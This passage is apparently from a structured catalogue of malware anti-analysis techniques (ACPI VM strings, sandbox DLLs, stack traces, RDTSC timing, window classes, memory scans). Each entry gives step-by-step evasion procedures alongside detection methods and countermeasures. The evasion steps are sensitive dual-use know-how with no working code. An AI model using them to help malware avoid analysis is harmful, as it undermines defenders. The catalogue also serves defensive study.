Attack Steps: Step 1: Use WMI queries or PowerShell to inspect the ACPI DSDT table from Win32_ComputerSystem.Step 2: Search for strings like VBOX__, VMWARE__, or XEN__ inside the ACPI table.Step 3: If such identifiers are found, the malware assumes a virtual machine and exits.Step 4: Otherwise, malware proceeds to execute normally.Step 5: Compare real and virtual environments to note the signature.Step 6: Use hex viewers or ACPI parsers to simulate table differences in training.
Impact: Detects VM using low-level hardware fingerprints
Detection Method: Monitor ACPI string scans
Solution: Obfuscate or strip VM vendor identifiers

Title: DLL Hook Detection (Sandbox DLLs)
Scenario Description: Malware checks for presence of analysis/sandbox DLLs loaded in memory such as sbiedll.dll, dbghelp.dll.
Attack Steps: Step 1: Use Python to enumerate all loaded modules/DLLs of the current process.Step 2: Search for DLLs like sbiedll.dll (Sandboxie), dbghelp.dll (debugger), or api_log.dll (CWSandbox).Step 3: If found, terminate or delay the malware.Step 4: If not found, execute the payload.Step 5: Use tools like Process Hacker to simulate loading/unloading DLLs and compare behavior.Step 6: Observe real-time changes in loaded modules during simulation.
Impact: Prevents malware execution when sandbox monitoring DLLs exist
Detection Method: Monitor module enumeration logic
Solution: Unload or rename suspicious DLLs during test

Title: Stack Trace Tampering
Scenario Description: Malware detects sandboxing by inspecting stack trace inconsistencies caused by API hooking.
Attack Steps: Step 1: Write a C++ program that raises a dummy exception (e.g., divide by zero).Step 2: In the exception handler, use RtlCaptureStackBackTrace or StackWalk64 to inspect the call stack.Step 3: Analyze if any unexpected hooks (sandbox DLLs, injected modules) are in the trace.Step 4: If abnormal call stacks are found (e.g., fake parent processes), abort execution.Step 5: If the stack is clean, proceed with payload.Step 6: Test this against sandboxes with API hooking frameworks (like Cuckoo).
Detection Method: Analyze abnormal stack patterns
Solution: Normalize stack traces or patch backtrace functions

Title: RDTSC Timing Check
Scenario Description: Malware measures processor clock ticks using RDTSC to detect time dilation in VMs.
Attack Steps: Step 1: Use inline assembly in C++ to execute the RDTSC instruction before and after a known task (e.g., loop over 10,000 iterations).Step 2: Calculate the delta (end - start ticks).Step 3: If the delta is too large for a simple task, it could indicate hypervisor interference.Step 4: If time distortion is detected, the malware exits silently.Step 5: On real hardware, this deviation is absent, and malware continues.Step 6: Analyze multiple iterations to reduce false positives.
Detection Method: Track use of RDTSC and compare timings
Solution: Mask timing discrepancies in VMs

Title: Window Class Name Check
Scenario Description: Malware enumerates open windows and checks for class names or titles related to debuggers/sandboxes.
Attack Steps: Step 1: Enumerate all open window handles using pygetwindow or win32gui.Step 2: For each window, retrieve its title and class name.Step 3: Look for known classes such as SbieCtrlWndClass (Sandboxie), OLLYDBG (OllyDbg).Step 4: If found, malware terminates or goes idle.Step 5: If nothing suspicious is found, execute dummy payload.Step 6: Simulate this in sandbox with visible windows and hide/show them to analyze effect.
Vulnerability: Visible UI elements betray analysis tools
Detection Method: Detect window enumeration patterns
Solution: Rename windows or classes during analysis

Title: Memory Scanning for Analysis Tools
Scenario Description: Malware scans memory of its own process to locate analysis tool patterns (strings or code stubs).
Attack Steps: Step 1: Open handle to own process memory using Windows API or Python's pywin32.Step 2: Read loaded memory regions in chunks.Step 3: Search for known strings or patterns like "sandbox", "cuckoo", "debug".Step 4: If found, malware quits execution.Step 5: Otherwise, execute payload.Step 6: Simulate string injection and observe how malware reacts.
Impact: Evades by scanning memory for keywords
Detection Method: Track memory reads within own process
Solution: Obfuscate strings or use encryption

Title: Reboot Count Check
Scenario Description: Malware queries system reboot count—high number may indicate snapshot/restores in a sandbox.
